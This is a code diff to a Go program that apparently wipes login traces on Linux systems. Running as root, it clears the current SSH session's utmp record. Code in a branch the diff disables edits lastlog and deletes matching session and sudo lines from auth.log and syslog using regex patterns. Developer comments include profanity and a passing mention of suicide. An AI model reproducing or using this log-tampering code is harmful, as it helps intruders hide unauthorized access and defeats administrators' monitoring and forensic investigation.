@@ -13,9 +13,11 @@ import (
 	authlog "test/AUTHLOG"
 	bf "test/BF"
 	check "test/CHECK"
+	getpty "test/GETPTY"
 	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
 	vars "test/VARS"
+	"time"
 )
 
 // When I wrote this Code
@@ -41,6 +43,7 @@ import (
 
 // suicide seems a good choice
 
+// I have change evrythong The hol programm needs to be changed FUUUUUUUCCCCCKKKKKKK
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
@@ -68,46 +71,57 @@ func init() {
 
 func main() {
 	// history.DelHistory()
-	if false {
+	connectedData, _ := getpty.GetConectedData()
+	// fmt.Println(x.Current, "------", x.Parent)
+	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart)
+	time.Sleep(2 * time.Second)
+	if true {
 		if vars.HideMe {
+
 			euid := os.Geteuid()
 			if euid == 0 {
 				// connectedUser := flag.String("u", "ubuntu", "Connected User")
 				flag.Parse()
+				myepoch, err := utmp.ParceUtmpFile(connectedData)
+				check.Check("Error On parshing UTMP file for EPOCH", err)
+				connectedData.TimeLoginSSHEpoch = myepoch
+				utmp.ClearUTMP(connectedData)
+				if false {
+					time.Sleep(5 * time.Second)
 
-				utmp.ClearUTMP(vars.Host, vars.ConnectedUser)
+					ConvertIPToBytearray(&connectedData.IP)
+					dataToInfl, _ := parceDataUtmpFile(connectedData.User)
 
-				ConvertIPToBytearray(&vars.Host)
-				x, _ := parceDataUtmpFile(vars.ConnectedUser)
+					lastlog.ChangeLastLog(&vars.Host, &dataToInfl, &vars.ConnectedUser)
 
-				lastlog.ChangeLastLog(&vars.Host, &x, &vars.ConnectedUser)
-				// /////////////////////////////////////////////////////////////////////////////
-				sessionStart := int(x.Time.Sec)
-				sessionStop := int(x.TimeEnd.Sec)
-				start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
-				// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
-				sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &vars.Host)
-				check.Check("Delete Auth Log ", err)
-				fmt.Println(sessionID)
+					// /////////////////////////////////////////////////////////////////////////////
+					sessionStart := int(dataToInfl.Time.Sec)
+					sessionStop := int(dataToInfl.TimeEnd.Sec)
+					start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
+					// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
+					sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &vars.Host)
+					check.Check("Delete Auth Log ", err)
+					fmt.Println(sessionID)
 
-				patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
-				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
-				if err != nil {
-					fmt.Println("Errpr", err)
-				}
-				ex, err := os.Executable()
-				if err != nil {
-					panic(err)
-				}
+					patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
+					err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
+					if err != nil {
+						fmt.Println("Errpr", err)
+					}
+					ex, err := os.Executable()
+					if err != nil {
+						panic(err)
+					}
 
-				exPath := filepath.Dir(ex)
-				patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
-				fmt.Println(patternDeleteSudoExec)
+					exPath := filepath.Dir(ex)
+					patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
+					fmt.Println(patternDeleteSudoExec)
 
-				check.Check("Error on delete Line Auth Log", err)
-				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
-				if err != nil {
-					fmt.Println(err)
+					check.Check("Error on delete Line Auth Log", err)
+					err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
+					if err != nil {
+						fmt.Println(err)
+					}
 				}
 			}
 		}
